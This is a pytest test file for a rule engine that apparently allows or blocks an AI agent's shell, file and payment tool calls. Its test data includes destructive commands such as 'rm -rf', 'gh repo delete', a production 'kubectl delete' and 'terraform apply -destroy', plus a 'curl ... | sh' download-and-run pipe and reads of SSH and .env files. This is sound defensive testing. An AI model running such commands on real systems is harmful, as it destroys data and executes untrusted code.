"""Predicate evaluation, scoping, decision combination and history predicates."""

from __future__ import annotations

from typing import Any

import pytest

from ember_armor.ledger.engine import MemoryHistory, evaluate
from ember_armor.ledger.model import Decision, Rule, parse_rule
from tests.ledger.helpers import facts_for, rule


def make_rule(when: dict[str, Any] | None = None, **fields: Any) -> Rule:
    if when is not None:
        fields["when"] = when
    return parse_rule(rule(fields.pop("rule_id", "r1"), **fields))


def fires(
    when: dict[str, Any], tool: str, payload: Any, platform: str = "posix"
) -> bool:
    decision = evaluate([make_rule(when)], facts_for(tool, payload, platform))
    return decision.effect != "none"


def command(**fields: Any) -> dict[str, Any]:
    return {"type": "command", **fields}


COMMAND_CASES = [
    # predicate, shell tool, command string, platform, expected
    (command(program="git"), "Bash", "git status", "posix", True),
    (command(program="git"), "Bash", "/usr/bin/git status", "posix", True),
    (command(program="git"), "Bash", "git.exe status", "posix", True),
    (command(program="git"), "Bash", "GIT status", "posix", False),
    (command(program="git"), "PowerShell", "GIT status", "windows", True),
    (
        command(program="git"),
        "PowerShell",
        r"& 'C:\Git\bin\GIT.EXE' status",
        "windows",
        True,
    ),
    (command(program="git"), "Bash", "echo git", "posix", False),
    (command(program=["npm", "pnpm"]), "Bash", "pnpm i", "posix", True),
    (command(program="git"), "Bash", "ls && sudo git gc", "posix", True),
    # subcommand: leading non-flag arguments
    (command(program="git", subcommand=["push"]), "Bash", "git push", "posix", True),
    (command(program="git", subcommand=["push"]), "Bash", "git pull", "posix", False),
    (
        command(program="git", subcommand=["push"]),
        "Bash",
        "git -C repo push",
        "posix",
        True,
    ),
    (
        command(program="git", subcommand=["push"]),
        "Bash",
        "git -c user.name=x --no-pager push",
        "posix",
        True,
    ),
    (
        command(program="git", subcommand=["push"]),
        "Bash",
        "git stash push",
        "posix",
        False,
    ),
    (
        command(program="gh", subcommand=["repo", "delete"]),
        "Bash",
        "gh repo delete o/r",
        "posix",
        True,
    ),
    (
        command(program="gh", subcommand=["repo", "delete"]),
        "Bash",
        "gh repo view",
        "posix",
        False,
    ),
    (
        command(program="kubectl", subcommand=["delete"]),
        "Bash",
        "kubectl --context prod -n web delete pod x",
        "posix",
        True,
    ),
    (
        command(program="docker", subcommand=["system", "prune"]),
        "Bash",
        "docker --context remote system prune",
        "posix",
        True,
    ),
    (
        command(program="reg", subcommand=["delete"]),
        "PowerShell",
        r"REG DELETE HKCU\x /f",
        "windows",
        True,
    ),
    # flags: combined short flags, --flag=value, exact long flags
    (command(program="rm", flags_any=["-r"]), "Bash", "rm -rf x", "posix", True),
    (command(program="rm", flags_any=["-r"]), "Bash", "rm -fr x", "posix", True),
    (command(program="rm", flags_any=["-r"]), "Bash", "rm -f x", "posix", False),
    (command(program="rm", flags_any=["-r"]), "Bash", "rm -- -r", "posix", False),
    (command(program="rm", flags_all=["-r", "-f"]), "Bash", "rm -rf x", "posix", True),
    (command(program="rm", flags_all=["-r", "-f"]), "Bash", "rm -r x", "posix", False),
    (
        command(program="git", flags_any=["-D"]),
        "Bash",
        "git branch -D x",
        "posix",
        True,
    ),
    (
        command(program="git", flags_any=["-D"]),
        "Bash",
        "git branch -d x",
        "posix",
        False,
    ),
    (
        command(program="git", flags_any=["--force"]),
        "Bash",
        "git push --force",
        "posix",
        True,
    ),
    (
        command(program="git", flags_any=["--force"]),
        "Bash",
        "git push --force-with-lease",
        "posix",
        False,
    ),
    (
        command(program="git", flags_any=["--force-with-lease"]),
        "Bash",
        "git push --force-with-lease=origin/main",
        "posix",
        True,
    ),
    (
        command(program="git", flags_any=["-f"]),
        "Bash",
        "git push --follow-tags",
        "posix",
        False,
    ),
    (
        command(program="terraform", flags_any=["-destroy"]),
        "Bash",
        "terraform apply -destroy",
        "posix",
        True,
    ),
    (
        command(program="git", flags_any=["-f"]),
        "PowerShell",
        "git clean -fd",
        "windows",
        True,
    ),
    # PowerShell parameters: case-insensitive, any prefix, attached value
    (
        command(program="Remove-Item", flags_any=["-Recurse"]),
        "PowerShell",
        "Remove-Item x -Recurse",
        "windows",
        True,
    ),
    (
        command(program="Remove-Item", flags_any=["-Recurse"]),
        "PowerShell",
        "remove-item x -RECURSE",
        "windows",
        True,
    ),
    (
        command(program="Remove-Item", flags_any=["-Recurse"]),
        "PowerShell",
        "rm x -r",
        "windows",
        True,
    ),
    (
        command(program="Remove-Item", flags_any=["-Recurse"]),
        "PowerShell",
        "rm x -Rec",
        "windows",
        True,
    ),
    (
        command(program="Remove-Item", flags_any=["-Recurse"]),
        "PowerShell",
        "rm x -Recurse:$true",
        "windows",
        True,
    ),
    (
        command(program="Remove-Item", flags_any=["-Recurse"]),
        "PowerShell",
        "rm x -Force",
        "windows",
        False,
    ),
    (
        command(program="Remove-Item", flags_any=["-Recurse"]),
        "PowerShell",
        "rm x -Recursive",
        "windows",
        False,
    ),
    (
        command(program="Remove-Item", flags_all=["-Recurse", "-Force"]),
        "PowerShell",
        "ri x -r -fo",
        "windows",
        True,
    ),
    # slash flags: case-insensitive, MSYS-doubled slash accepted
    (
        command(program="rd", flags_any=["/s"]),
        "Bash",
        'cmd //c "rd /S /Q x"',
        "windows",
        True,
    ),
    (
        command(program="rd", flags_any=["/s"]),
        "Bash",
        'cmd //c "rd /q x"',
        "windows",
        False,
    ),
    (
        command(program="bcdedit", flags_any=["/set"]),
        "Bash",
        "bcdedit //set testsigning on",
        "windows",
        True,
    ),
    # args_any_glob
    (
        command(program="kubectl", args_any_glob=["*prod*"]),
        "Bash",
        "kubectl get pods -n production",
        "posix",
        True,
    ),
    (
        command(program="kubectl", args_any_glob=["*prod*"]),
        "Bash",
        "kubectl get pods -n staging",
        "posix",
        False,
    ),
    (
        command(program="git", args_any_glob=["+*"]),
        "Bash",
        "git push origin +main",
        "posix",
        True,
    ),
    (
        command(program="echo", args_any_glob=["ROOT"]),
        "Bash",
        "echo root",
        "posix",
        False,
    ),
    (
        command(program="echo", args_any_glob=["ROOT"]),
        "PowerShell",
        "echo root",
        "windows",
        True,
    ),
    # shell restriction
    (command(program="rm", shell="bash"), "Bash", "rm x", "posix", True),
    (
        command(program="Remove-Item", shell="bash"),
        "PowerShell",
        "rm x",
        "windows",
        False,
    ),
    (
        command(program="Remove-Item", shell="powershell"),
        "PowerShell",
        "rm x",
        "windows",
        True,
    ),
    (command(program="rm", shell="powershell"), "Bash", "rm x", "posix", False),
    (
        command(program="Remove-Item", shell="powershell"),
        "Bash",
        "pwsh -c 'rm x'",
        "posix",
        True,
    ),
    (command(program="rd", shell="bash"), "Bash", 'cmd //c "rd x"', "windows", False),
    (command(program="rd"), "Bash", 'cmd //c "rd x"', "windows", True),
    # a command predicate never matches a non-shell tool
    (
        command(program="git"),
        "Write",
        {"file_path": "git", "content": "git push"},
        "posix",
        False,
    ),
]


@pytest.mark.parametrize(
    ("when", "tool", "payload", "platform", "expected"), COMMAND_CASES
)
def test_command_predicate(
    when: dict[str, Any], tool: str, payload: Any, platform: str, expected: bool
) -> None:
    assert fires(when, tool, payload, platform) is expected


def path(**fields: Any) -> dict[str, Any]:
    return {"type": "path", **fields}


PATH_CASES = [
    (path(op="write", under="/work/app/src"), "Write", {"file_path": "src/a.py"}, True),
    (
        path(op="write", under="/work/app/src"),
        "Write",
        {"file_path": "docs/a.md"},
        False,
    ),
    (path(op="write", under="/work/app/src"), "Read", {"file_path": "src/a.py"}, False),
    (path(op="any", under="/work/app/src"), "Read", {"file_path": "src/a.py"}, True),
    (path(under="src"), "Edit", {"file_path": "/work/app/src/x/y.py"}, True),
    (
        path(under="src", not_under="src/generated"),
        "Edit",
        {"file_path": "src/generated/api.py"},
        False,
    ),
    (
        path(under="src", not_under="src/generated"),
        "Edit",
        {"file_path": "src/api.py"},
        True,
    ),
    (path(glob="*.lock"), "Write", {"file_path": "deep/dir/yarn.lock"}, True),
    (path(glob="*.lock"), "Write", {"file_path": "deep/dir/yarn.lock.txt"}, False),
    (
        path(glob=["**/migrations/*.sql"]),
        "Edit",
        {"file_path": "db/migrations/1.sql"},
        True,
    ),
    (path(glob="config/*.yml"), "Edit", {"file_path": "config/app.yml"}, True),
    (path(glob="config/*.yml"), "Edit", {"file_path": "other/config/app.yml"}, False),
    (path(under="~/.ssh"), "Read", {"file_path": "/home/dev/.ssh/config"}, True),
    (path(op="delete"), "Bash", "rm notes.txt", True),
    (path(op="delete", recursive=True), "Bash", "rm notes.txt", False),
    (path(op="delete", recursive=True), "Bash", "rm -r notes", True),
    (path(op="delete", recursive=False), "Bash", "rm -r notes", False),
    (path(op="delete", under="/work"), "Bash", "cd /tmp && rm -rf x", False),
    (path(op="write", glob="*.env"), "Bash", "echo A=1 > prod.env", True),
    (path(op="read", glob="**/.env"), "Bash", "cat .env.example .env", True),
    (path(op="read"), "Bash", "git status", False),
]


@pytest.mark.parametrize(("when", "tool", "payload", "expected"), PATH_CASES)
def test_path_predicate(
    when: dict[str, Any], tool: str, payload: Any, expected: bool
) -> None:
    assert fires(when, tool, payload) is expected


def test_path_comparison_is_case_insensitive_on_windows_only() -> None:
    when = path(under=r"C:\Work\App\SRC")
    assert fires(when, "Edit", {"file_path": r"c:\work\app\src\a.py"}, "windows")
    assert fires(when, "Edit", {"file_path": "/c/work/app/src/a.py"}, "windows")
    assert not fires(path(under="/work/APP"), "Edit", {"file_path": "/work/app/a.py"})


def test_relative_patterns_resolve_against_the_rule_base() -> None:
    item = parse_rule(rule(when=path(under="secrets")), base="/work")
    inside = facts_for("Read", {"file_path": "/work/secrets/k.txt"})
    outside = facts_for("Read", {"file_path": "/work/app/secrets/k.txt"})
    assert evaluate([item], inside).effect == "deny"
    assert evaluate([item], outside).effect == "none"


def arg(name: str, op: str, value: Any) -> dict[str, Any]:
    return {"type": "arg", "name": name, "op": op, "value": value}


TRANSFER = {
    "amount": 7_000_000,
    "to": {"country": "CH", "tags": ["a", "b"]},
    "memo": "Q3 fee",
}
ARG_CASES = [
    (arg("amount", ">", 5_000_000), True),
    (arg("amount", ">", 7_000_000), False),
    (arg("amount", ">=", 7_000_000), True),
    (arg("amount", "<", 10_000_000), True),
    (arg("amount", "<=", 1), False),
    (arg("amount", "==", 7_000_000), True),
    (arg("amount", "!=", 7_000_000), False),
    (arg("to.country", "==", "CH"), True),
    (arg("to.country", "!=", "DE"), True),
    (arg("to.country", "in", ["CH", "LI"]), True),
    (arg("to.country", "in", ["DE"]), False),
    (arg("to.tags.1", "==", "b"), True),
    (arg("to.tags.5", "==", "b"), False),
    (arg("memo", "matches", r"^Q\d"), True),
    (arg("memo", "matches", r"^fee"), False),
    (arg("amount", "matches", "7"), False),
    (arg("missing", "==", 1), False),
    (arg("missing", "!=", 1), False),
    (arg("memo", ">", 5), False),
    ({"type": "expr", "lhs": {"amount": 1}, "op": ">", "rhs": 5_000_000}, True),
    ({"type": "expr", "lhs": {"amount": 2, "fee": 1}, "op": ">", "rhs": 1}, False),
    ({"type": "text_regex", "field": "memo", "pattern": "(?i)q3"}, True),
    ({"type": "text_regex", "field": "to", "pattern": '"country": "CH"'}, True),
    ({"type": "text_regex", "field": "nope", "pattern": "."}, False),
]


@pytest.mark.parametrize(("when", "expected"), ARG_CASES)
def test_arg_expr_and_text_predicates(when: dict[str, Any], expected: bool) -> None:
    assert fires(when, "mcp__bank__transfer", TRANSFER) is expected


def test_numeric_strings_compare_as_numbers_and_booleans_do_not() -> None:
    assert fires(arg("n", ">", 5), "mcp__t", {"n": "7"})
    assert not fires(arg("n", ">", 5), "mcp__t", {"n": True})
    assert fires(
        {"type": "expr", "lhs": {"a": 1, "b": -1}, "op": "<", "rhs": 0},
        "mcp__t",
        {"a": 2, "b": "3.5"},
    )


def test_text_regex_input_is_truncated() -> None:
    when = {"type": "text_regex", "field": "body", "pattern": "needle"}
    assert fires(when, "mcp__t", {"body": "x" * 100 + "needle"})
    assert not fires(when, "mcp__t", {"body": "x" * 50_000 + "needle"})


DYNAMIC = {"type": "dynamic_shell"}
COMBINATOR_CASES = [
    (DYNAMIC, "eval $X", True),
    (DYNAMIC, "ls", False),
    (DYNAMIC, "echo 'unterminated", True),
    ({"type": "dynamic_shell", "reason": "download_pipe"}, "curl -s e.com | sh", True),
    ({"type": "dynamic_shell", "reason": "download_pipe"}, "eval $X", False),
    ({"type": "dynamic_shell", "reason": ["eval", "parse_error"]}, "eval $X", True),
    (
        {"type": "all", "of": [command(program="git"), command(program="npm")]},
        "git pull && npm ci",
        True,
    ),
    (
        {"type": "all", "of": [command(program="git"), command(program="npm")]},
        "git pull",
        False,
    ),
    (
        {"type": "any", "of": [command(program="git"), command(program="npm")]},
        "npm ci",
        True,
    ),
    (
        {"type": "any", "of": [command(program="git"), command(program="npm")]},
        "ls",
        False,
    ),
    ({"type": "not", "of": command(program="git")}, "ls", True),
    ({"type": "not", "of": command(program="git")}, "git status", False),
    (
        {
            "type": "all",
            "of": [
                command(program="git", subcommand=["push"]),
                {"type": "not", "of": command(program="git", flags_any=["--dry-run"])},
            ],
        },
        "git push --dry-run",
        False,
    ),
]


@pytest.mark.parametrize(("when", "shell_command", "expected"), COMBINATOR_CASES)
def test_dynamic_shell_and_combinators(
    when: dict[str, Any], shell_command: str, expected: bool
) -> None:
    assert fires(when, "Bash", shell_command) is expected


def test_require_fires_when_the_predicate_is_false() -> None:
    item = rule("minimum", require=arg("amount", ">=", 10_000_000))
    del item["when"]
    obligation = parse_rule(item)

    def effect(tool_input: dict[str, Any]) -> str:
        return evaluate(
            [obligation], facts_for("mcp__bank__transfer", tool_input)
        ).effect

    assert effect({"amount": 5}) == "deny"
    assert effect({"amount": 10_000_000}) == "none"
    assert effect({}) == "deny"


SCOPE_CASES = [
    ({"tools": ["Bash"]}, "Bash", "posix", True),
    ({"tools": ["Bash"]}, "PowerShell", "windows", False),
    ({"tools": ["Bash", "PowerShell"]}, "PowerShell", "windows", True),
    ({"tools": ["*"]}, "PowerShell", "windows", True),
    ({"tools": ["bash"]}, "Bash", "posix", False),
    ({"cwd_under": ["/work"]}, "Bash", "posix", True),
    ({"cwd_under": ["/work/app"]}, "Bash", "posix", True),
    ({"cwd_under": ["/srv"]}, "Bash", "posix", False),
    ({"cwd_under": ["/srv", "/work"]}, "Bash", "posix", True),
    ({"cwd_under": [r"c:\WORK"]}, "PowerShell", "windows", True),
    ({"cwd_under": ["/c/work/app"]}, "Bash", "windows", True),
    ({"tools": ["Bash"], "cwd_under": ["/srv"]}, "Bash", "posix", False),
    ({}, "Bash", "posix", True),
]


@pytest.mark.parametrize(("applies", "tool", "platform", "expected"), SCOPE_CASES)
def test_applies_scope(
    applies: dict[str, Any], tool: str, platform: str, expected: bool
) -> None:
    item = make_rule(command(program="git"), applies=applies)
    decision = evaluate([item], facts_for(tool, "git status", platform))
    assert (decision.effect != "none") is expected


def test_tool_globs_scope_mcp_tools() -> None:
    item = make_rule(arg("amount", ">", 100), applies={"tools": ["mcp__bank__*"]})
    assert (
        evaluate([item], facts_for("mcp__bank__transfer", {"amount": 500})).effect
        == "deny"
    )
    assert (
        evaluate([item], facts_for("mcp__shop__pay", {"amount": 500})).effect == "none"
    )


COMBINE_CASES = [
    ([], "none"),
    (["warn"], "warn"),
    (["warn", "ask"], "ask"),
    (["ask", "warn", "deny"], "deny"),
    (["deny", "deny"], "deny"),
    (["ask", "ask", "warn"], "ask"),
]


@pytest.mark.parametrize(("effects", "expected"), COMBINE_CASES)
def test_most_restrictive_effect_wins(effects: list[str], expected: str) -> None:
    rules = [
        make_rule(command(program="git"), rule_id=f"r{i}", effect=effect)
        for i, effect in enumerate(effects)
    ]
    decision = evaluate(rules, facts_for("Bash", "git status"))
    assert decision.effect == expected
    assert sorted(f.id for f in decision.fired) == sorted(r.id for r in rules)
    if decision.fired:
        assert decision.fired[0].effect == expected


def test_decision_carries_text_and_source_of_each_fired_rule() -> None:
    hit = make_rule(
        command(program="git"), rule_id="hit", text="No git here.", source="Sam"
    )
    miss = make_rule(command(program="npm"), rule_id="miss")
    decision = evaluate([hit, miss], facts_for("Bash", "git status"))
    assert [(f.id, f.text, f.source, f.effect) for f in decision.fired] == [
        ("hit", "No git here.", "Sam", "deny")
    ]
    assert evaluate([miss], facts_for("Bash", "git status")) == Decision()


# ---------------------------------------------------------------------------
# History predicates, with an in-memory history
# ---------------------------------------------------------------------------
TESTS_FIRST = {
    "type": "all",
    "of": [
        command(program="git", subcommand=["push"]),
        {"type": "not_preceded_by", "predicate": command(program=["pytest", "npm"])},
    ],
}


def test_not_preceded_by_orders_calls_within_a_session() -> None:
    item = make_rule(TESTS_FIRST, text="Run the tests before pushing.")
    push = facts_for("Bash", "git push")
    history = MemoryHistory()
    assert evaluate([item], push, history).effect == "deny"
    history.add(facts_for("Bash", "ls"), when=10.0)
    assert evaluate([item], push, history).effect == "deny"
    history.add(facts_for("Bash", "pytest -q", session="other"), when=11.0)
    assert evaluate([item], push, history).effect == "deny"
    history.add(facts_for("Bash", "cd api && pytest -q"), when=12.0)
    assert evaluate([item], push, history).effect == "none"


def test_no_history_means_no_earlier_calls() -> None:
    item = make_rule(TESTS_FIRST)
    assert evaluate([item], facts_for("Bash", "git push"), None).effect == "deny"


def count(maximum: int, within: float | None = None) -> dict[str, Any]:
    pred: dict[str, Any] = {
        "type": "count_exceeds",
        "predicate": {"type": "path", "op": "delete"},
        "max": maximum,
    }
    if within is not None:
        pred["within_seconds"] = within
    return pred


def test_count_exceeds_counts_earlier_matching_calls() -> None:
    history = MemoryHistory()
    current = facts_for("Bash", "rm d.txt")
    item = make_rule(count(2))
    for index, name in enumerate(["a.txt", "b.txt"]):
        history.add(facts_for("Bash", f"rm {name}"), when=float(index))
        assert evaluate([item], current, history, now=100.0).effect == "none"
    history.add(facts_for("Bash", "ls"), when=3.0)
    assert evaluate([item], current, history, now=100.0).effect == "none"
    history.add(facts_for("Bash", "rm c.txt"), when=4.0)
    assert evaluate([item], current, history, now=100.0).effect == "deny"


def test_count_exceeds_respects_the_time_window() -> None:
    history = MemoryHistory()
    for when in (10.0, 20.0, 95.0):
        history.add(facts_for("Bash", "rm x"), when=when)
    current = facts_for("Bash", "rm y")
    assert (
        evaluate([make_rule(count(1, within=60))], current, history, now=100.0).effect
        == "none"
    )
    assert (
        evaluate([make_rule(count(1, within=95))], current, history, now=100.0).effect
        == "deny"
    )
    assert evaluate([make_rule(count(2))], current, history, now=100.0).effect == "deny"


def test_history_predicates_use_path_patterns_of_the_current_flavour() -> None:
    item = make_rule(
        {
            "type": "not_preceded_by",
            "predicate": {"type": "path", "op": "read", "under": r"C:\Work\App\docs"},
        }
    )
    history = MemoryHistory()
    current = facts_for("Bash", "ls", "windows")
    assert evaluate([item], current, history).effect == "deny"
    history.add(
        facts_for("Read", {"file_path": "/c/work/app/docs/spec.md"}, "windows"), 1.0
    )
    assert evaluate([item], current, history).effect == "none"
